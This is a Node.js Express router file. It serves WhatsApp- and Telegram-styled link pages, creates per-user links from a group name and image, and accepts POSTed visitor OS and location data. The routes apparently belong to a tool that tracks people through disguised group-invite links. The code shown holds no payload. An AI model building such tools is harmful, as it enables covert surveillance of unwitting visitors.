var express = require('express');
var router = express.Router();
var path = require('path');
const AuthToken = require('./../middleware/auth')

const commonController = require('../controller/commonController');
const osDetailsController = require('../controller/osdetailsController');
const generateUrlController = require('../controller/generateUrlController');
const upload = require('../config/multer');

/* GET home page. */
// router.get('/', function(req, res, next) {
//   res.render('index', { title: 'Express' });
// });

router.post('/uploadFile', upload.any(), async function (req, res, next) {
  let data = await commonController.uploadFile(req, res)
  res.send(data)
})

router.get('/whatsapplink/:userId', function(req, res, next) {
  console.log('####', req.params.userId);
  res.sendFile(path.join(__dirname + '/../public/whatsapp.html'))
});

router.get('/whatsapplink', function(req, res, next) {
  console.log('####');
  console.log('@@@', path.join(__dirname + '/../public/whatsapp.html'))
  res.sendFile(path.join(__dirname + '/../public/whatsapp.html'))
});

router.get('/telegramlink', function(req, res, next) {
  console.log('####');
  console.log('@@@', path.join(__dirname + '/../public/telegram.html'))
  res.sendFile(path.join(__dirname + '/../public/telegram.html'))
});

router.post('/createUrl', AuthToken, async function(req, res) {
  const data = await generateUrlController.addURLData({groupName: req.body.groupName, groupImg: req.body.groupImg, userUniqId: req.userData.userUniquId}, res)
  console.log('@@@userData', data);
  res.json({
    data: data
  })
})


router.post('/saveuserData', async function (req, res) {
  let data = await osDetailsController.addOSDetails(req)
  res.json({
    data: 'data saved succesfully'
  })
})

router.post('/saveLocationData', function (req, res) {
  console.log('@@@@req.body', req.body);
  res.json({
    data: 'data saved succesfully'
  })
  
})

module.exports = router;
